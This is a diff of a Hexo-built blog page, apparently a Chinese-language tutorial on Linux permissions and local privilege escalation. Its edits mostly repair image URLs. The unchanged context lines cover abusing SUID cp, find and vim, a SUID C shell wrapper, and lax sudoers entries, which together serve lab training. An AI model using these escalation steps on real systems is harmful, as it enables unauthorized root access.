@@ -13,107 +13,107 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Linux系统权限 文件基本权限 授权信息查看 12ls -l file ###文件ls -ld westos ###目录   文件列表信息分为：文件类型、权限、链接数、所属用户、所属用户组、文件大小、最后修改时间、文件名。 linux一共有7种文件类型,分别如下: - ：普通文件 d ：目录文件 l ： 软链接（类似Windows的快捷方式） (下面四种是特殊文件) b：块设备文件（例如硬盘、光">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021641162.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021641867.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021642168.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021642627.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021643589.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021643707.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021643009.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021644588.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021644931.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021644035.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021645465.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021645594.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021646744.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021646597.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021647748.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021647565.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021648799.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021648380.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021648338.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021648513.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021649990.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021649568.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021649472.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021649322.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021650482.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021650294.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021650682.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021651584.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021652817.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021652927.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021653695.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021653912.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021654136.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021654747.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021654181.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021655543.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021655509.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021655094.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021655261.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021655831.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021656644.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021656521.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021657208.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021657300.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021657150.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021658904.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021658617.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021658376.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021658432.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021659630.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021659522.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021700381.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021700081.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021701537.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021702470.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021702260.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021703832.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021703510.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021704946.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021704297.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021704045.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021705474.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021705264.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021706130.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021706203.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021707873.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021707719.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021707145.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021708726.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021708515.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021709892.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021709579.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021709699.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021711925.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021711697.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021711025.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021711198.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021712359.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021714486.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021714104.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021715042.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021715175.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021716322.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021717923.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021717471.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021718131.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021718547.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021718742.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021719260.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021719510.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021719991.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021641162.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021641867.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021642168.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021642627.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021643589.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021643707.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021643009.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021644588.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021644931.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021644035.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021645465.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021645594.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021646744.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021646597.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021647748.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021647565.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021648799.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021648380.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021648338.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021648513.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021649990.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021649568.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021649472.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021649322.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021650482.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021650294.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021650682.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021651584.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021652817.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021652927.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021653695.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021653912.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021654136.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021654747.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021654181.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655543.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655509.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655094.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655261.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021655831.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021656644.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021656521.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021657208.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021657300.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021657150.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021658904.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021658617.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021658376.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021658432.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021659630.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021659522.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021700381.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021700081.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021701537.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021702470.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021702260.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021703832.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021703510.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021704946.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021704297.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021704045.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021705474.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021705264.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021706130.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021706203.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021707873.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021707719.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021707145.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021708726.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021708515.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021709892.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021709579.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021709699.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021711925.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021711697.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021711025.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021711198.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021712359.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021714486.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021714104.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021715042.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021715175.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021716322.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021717923.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021717471.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021718131.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021718547.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021718742.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021719260.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021719510.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021719991.png">
 <meta property="og:image" content="http://www.ybxyz.top/wp-content/uploads/2023/04/%E5%9B%BE%E7%89%87-127.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021720343.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021720560.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021721244.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021721564.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021720343.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021720560.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021721244.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021721564.png">
 <meta property="article:published_time" content="2023-04-12T02:46:56.000Z">
-<meta property="article:modified_time" content="2023-10-02T09:21:44.747Z">
+<meta property="article:modified_time" content="2023-10-02T10:30:36.926Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021641162.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021641162.png">
   
     <link rel="alternate" href="/project/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -199,7 +199,7 @@
 <p><strong>授权信息查看</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l file ###文件</span><br><span class="line">ls -ld westos ###目录</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021641162.png" alt="image-20231002164131090"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021641162.png" alt="image-20231002164131090"></p>
 <p>文件列表信息分为：文件类型、权限、链接数、所属用户、所属用户组、文件大小、最后修改时间、文件名。</p>
 <p>linux一共有7种文件类型,分别如下:</p>
 <p>- ：普通文件</p>
@@ -288,48 +288,48 @@
 <p>即如果root给一个程序赋予了SUID权限，则普通用户在执行该程序过程中，是root权限。</p>
 <p><strong>cp</strong></p>
 <p>以cp为例，这里给cp添加SUID权限做测试，拥有SUID权限的程序会有rwx变成rws。（rws中的s就是SUID权限）</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021641867.png" alt="image-20231002164155790"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021641867.png" alt="image-20231002164155790"></p>
 <p>可以通过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
 <p>命令来查找拥有SUID权限的程序。</p>
 <p>perm指定权限，-u&#x3D;s代表SUID权限，type指定文件类型，f表示常规文件。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021642168.png" alt="image-20231002164235117"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021642168.png" alt="image-20231002164235117"></p>
 <p>当普通用户运行cp命令时，此时的cp权限就为root，利用时，可以cp把&#x2F;etc&#x2F;passwd复制到桌面，然后进行修改。</p>
 <p>首先用openssl生成一个密码。passwd参数代表生成一个密码，-1为md5，-salt指定盐（随意指定），最后跟要加密的值，也就是密码123456</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021642627.png" alt="image-20231002164244581"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021642627.png" alt="image-20231002164244581"></p>
 <p>在桌面创建一个passwd文件，将&#x2F;etc&#x2F;passwd中的内容复制进去</p>
 <p>然后按照&#x2F;etc&#x2F;passwd的格式添加一个新用户，权限按root的写即可。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021643589.png" alt="image-20231002164325542"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021643589.png" alt="image-20231002164325542"></p>
 <p>添加后我们用cp再把文件复制回去进行替换，此时就添加了一个abcd用户，权限为root。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021643707.png" alt="image-20231002164336647"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021643707.png" alt="image-20231002164336647"></p>
 <p>提权成功</p>
 <p><strong>find</strong></p>
 <p>find命令在拥有SUID权限的情况下，也可以用来进行提权。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021643009.png" alt="image-20231002164347937"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021643009.png" alt="image-20231002164347937"></p>
 <p>只需要使用exec参数即可。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021644588.png" alt="image-20231002164401533"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021644588.png" alt="image-20231002164401533"></p>
 <p>find的exec参数用来指定其它命令，以便于来处理搜到的结果。结果的输出，需要以分号来结束，在bash环境中分号代表代码块结束，有特殊意义，所以这里需要进行转义。</p>
 <p><strong>vim</strong></p>
 <p>vim在拥有SUID权限的情况下，也可以用来进行提权</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021644931.png" alt="image-20231002164422861"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021644931.png" alt="image-20231002164422861"></p>
 <p>当vim被赋予SUID权限后，意味着如何用户都可以使用vim命令来编辑那些只能由root用户编辑的文件，例如通过vim来编辑&#x2F;etc&#x2F;sudoers文件（普通用户直接访问会被拒绝），在sudoers文件中配置普通用户的权限，权限和root一样，这里以kali用户为例，添加如下内容：</p>
 <p>kali ALL&#x3D;(ALL:ALL) ALL</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021644035.png" alt="image-20231002164458991"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021644035.png" alt="image-20231002164458991"></p>
 <p>vim编辑后保存时用**wq!**强制保存，vim运行时虽然是root权限，但wq依然会提示只读</p>
 <p>随后sudo bash 就会获取一个root的shell</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021645465.png" alt="image-20231002164513409"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021645465.png" alt="image-20231002164513409"></p>
 <p><strong>脚本</strong></p>
 <p>除了系统的一些可执行命令，自己写的可执行文件可以以添加SUID权限</p>
 <p>c语言示例代码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;sys/types.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    setuid(geteuid());</span><br><span class="line">    system(&quot;/bin/bash&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>使用gcc编译</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021645594.png" alt="image-20231002164551552"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021645594.png" alt="image-20231002164551552"></p>
 <p>编译后传入靶机，放在桌面，然后添加SUID权限进行测试</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021646744.png" alt="image-20231002164600690"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021646744.png" alt="image-20231002164600690"></p>
 <p>普通用户执行该文件，会返回一个root权限的shell</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021646597.png" alt="image-20231002164614560"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021646597.png" alt="image-20231002164614560"></p>
 <p><strong>总结</strong></p>
 <p>有很多命令在被添加SUID权限的情况下，都可以用来进行提权</p>
 <p>更多命令和用法可以参考：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
@@ -340,14 +340,14 @@
 <p><strong>sudoers文件</strong></p>
 <p>&#x2F;etc&#x2F;sudoers文件，是sudo权限的配置文件。当使用sudo接命令时，linux系统会在sudoers文件中查找当前用户，根据当前用户权限配置来决定是否可以运行相关命令。</p>
 <p>例如添加kali用户的相关配置：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021647748.png" alt="image-20231002164705713"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021647748.png" alt="image-20231002164705713"></p>
 <p>格式如下：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021647565.png" alt="image-20231002164755520"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021647565.png" alt="image-20231002164755520"></p>
 <p><strong>sudo su &amp;&amp; sudo bash</strong></p>
 <p>当没有对普通用户做严格的限制时，或者配置权限过大时，则可以尝试sudo su来切换到root权限。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021648799.png" alt="image-20231002164807747"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021648799.png" alt="image-20231002164807747"></p>
 <p>或者执行sudo bash</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021648380.png" alt="image-20231002164830340"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021648380.png" alt="image-20231002164830340"></p>
 <p>当visudo命令不能用时，限制了部分命令，则可以尝试下vim是否被禁用，sudo vim也可以编辑</p>
 <p>sudoers文件，且wq!可以成功保存。</p>
 <p>（<strong>visudo</strong>命令编辑sudo命令使用的<strong>sudoers</strong>文件）</p>
@@ -362,48 +362,48 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa ALL=(ALL:ALL) /usr/bin/find,/usr/bin/perl,/usr/bin/python3,/usr/bin/less,/usr/bin/awk,/usr/bin/man,/usr/bin/vi</span><br></pre></td></tr></table></figure>
 
 <p>这时aaa用户使用sudo就只能执行配置好的命令，sudo su和sudo bash被禁止执行。</p>
